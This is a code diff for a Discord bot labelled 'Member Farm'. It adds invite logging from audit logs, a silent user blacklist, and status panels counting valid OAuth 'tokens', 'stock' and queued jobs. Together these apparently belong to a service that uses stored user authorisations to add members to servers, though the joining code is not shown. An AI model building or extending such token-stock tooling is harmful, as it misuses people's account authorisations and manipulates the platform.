@@ -1,7 +1,7 @@
 // language: JavaScript, file: index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, Partials, Events } = require('discord.js');
-const { init, one, many } = require('./db');
+const { Client, GatewayIntentBits, Partials, Events, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
+const { init, one, many, query, getSetting } = require('./db');
 const { createOAuthServer } = require('./oauth');
 const { handleCommand } = require('./commands');
 const logs = require('./logs');
@@ -29,6 +29,7 @@ const client = new Client({
 
 client.pendingConfirms = new Map();
 client.tokenPages = new Map();
+client.bootAt = Date.now();
 
 async function isAntiLeave(guildId) {
   const main = config.MAIN_GUILD_ID || '1499704751481294878';
@@ -49,7 +50,39 @@ async function isAntiLeave(guildId) {
   });
 
   client.on(Events.GuildCreate, async (guild) => {
-    logs.serverLog(client, 'Bot added', `Joined **${guild.name}** (\`${guild.id}\`) — ${guild.memberCount} members`);
+    let inviterId = null;
+    let inviterTag = null;
+    try {
+      const logsAudit = await guild.fetchAuditLogs({
+        type: 28, // BOT_ADD
+        limit: 5,
+      }).catch(() => null);
+      const entry = logsAudit?.entries?.find(
+        e => e.target?.id === client.user.id && Date.now() - e.createdTimestamp < 15000
+      );
+      if (entry?.executor) {
+        inviterId = entry.executor.id;
+        inviterTag = entry.executor.tag || entry.executor.username;
+      }
+    } catch (e) {
+      console.error('audit log', e.message);
+    }
+
+    await query(
+      `INSERT INTO bot_invites (guild_id, guild_name, inviter_id, inviter_tag, member_count)
+       VALUES ($1, $2, $3, $4, $5)`,
+      [guild.id, guild.name, inviterId, inviterTag, guild.memberCount]
+    ).catch(e => console.error('bot_invites insert', e.message));
+
+    logs.botAddedLog(client, {
+      name: guild.name,
+      id: guild.id,
+      memberCount: guild.memberCount,
+      inviterId,
+      inviterTag,
+      botGuilds: client.guilds.cache.size,
+      icon: guild.iconURL({ size: 128 }),
+    });
   });
 
   client.on(Events.GuildDelete, async (guild) => {
@@ -57,11 +90,57 @@ async function isAntiLeave(guildId) {
   });
 
   client.on(Events.MessageCreate, async (message) => {
+    // user banfarm gate
+    if (message.author && !message.author.bot) {
+      const bl = await one('SELECT reason FROM user_blacklist WHERE user_id = $1', [message.author.id]);
+      if (bl) {
+        const prefix = (await getSetting('prefix', config.DEFAULT_PREFIX)) || config.DEFAULT_PREFIX;
+        if (message.content.startsWith(prefix)) {
+          // silent block except owner
+          if (String(message.author.id) !== String(config.OWNER_ID)) return;
+        }
+      }
+    }
     await handleCommand(message, client);
   });
 
   client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isButton()) return;
+
+    // panel live buttons
+    if (interaction.customId === 'panel_stock') {
+      const count = (await one(
+        'SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1'
+      ))?.c || 0;
+      return interaction.reply({
+        embeds: [new EmbedBuilder().setTitle('Stock').setColor(0x5865f2)
+          .addFields({ name: 'Available', value: '`' + count + '`', inline: true })
+          .setFooter({ text: 'Member Farm' }).setTimestamp()],
+        ephemeral: true,
+      });
+    }
+    if (interaction.customId === 'panel_status') {
+      const uptimeMs = client.uptime || 0;
+      const h = Math.floor(uptimeMs / 3600000);
+      const m = Math.floor((uptimeMs % 3600000) / 60000);
+      const stock = (await one(
+        'SELECT COUNT(*)::int AS c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1'
+      ))?.c || 0;
+      const tokens = (await one('SELECT COUNT(*)::int AS c FROM tokens WHERE valid = 1'))?.c || 0;
+      const qC = (await one(`SELECT COUNT(*)::int AS c FROM queue WHERE status = 'pending'`))?.c || 0;
+      const paused = await queue.isPaused();
+      return interaction.reply({
+        embeds: [new EmbedBuilder().setTitle('Status').setColor(0x57f287).addFields(
+          { name: 'Uptime', value: '`' + h + 'h ' + m + 'm`', inline: true },
+          { name: 'Ping', value: '`' + Math.round(client.ws.ping) + 'ms`', inline: true },
+          { name: 'Guilds', value: '`' + client.guilds.cache.size + '`', inline: true },
+          { name: 'Auths', value: '`' + tokens + '`', inline: true },
+          { name: 'Stock', value: '`' + stock + '`', inline: true },
+          { name: 'Queue', value: '`' + qC + '`' + (paused ? ' PAUSED' : ''), inline: true }
+        ).setFooter({ text: 'Member Farm' }).setTimestamp()],
+        ephemeral: true,
+      });
+    }
 
     if (interaction.customId.startsWith('confirm_') || interaction.customId.startsWith('decline_')) {
       const id = interaction.customId.replace(/^(confirm_|decline_)/, '');
@@ -79,7 +158,7 @@ async function isAntiLeave(guildId) {
         logs.adminLog(client, 'Queue cleared', `By <@${interaction.user.id}>`);
       } else if (pending.action === 'leave') {
         if (await isAntiLeave(pending.guildId)) {
-          return interaction.update({ content: `Protected (antileave / main server): cannot leave \`${pending.guildId}\`.`, components: [] });
+          return interaction.update({ content: `Protected: cannot leave \`${pending.guildId}\`.`, components: [] });
         }
         const g = client.guilds.cache.get(pending.guildId);
         if (g) await g.leave();
@@ -94,19 +173,11 @@ async function isAntiLeave(guildId) {
         let left = 0;
         let skipped = 0;
         for (const g of [...client.guilds.cache.values()]) {
-          if (protectedIds.has(String(g.id))) {
-            skipped++;
-            continue;
-          }
-          try {
-            await g.leave();
-            left++;
-          } catch (e) {
-            console.error('leave fail', g.id, e.message);
-          }
+          if (protectedIds.has(String(g.id))) { skipped++; continue; }
+          try { await g.leave(); left++; } catch (e) { console.error('leave fail', g.id, e.message); }
         }
         await interaction.update({
-          content: `Left **${left}** servers. Skipped **${skipped}** protected (antileave / main).`,
+          content: `Left **${left}** servers. Skipped **${skipped}** protected.`,
           components: [],
         });
         logs.adminLog(client, 'Leave all', `By <@${interaction.user.id}> left=${left} skipped=${skipped}`);
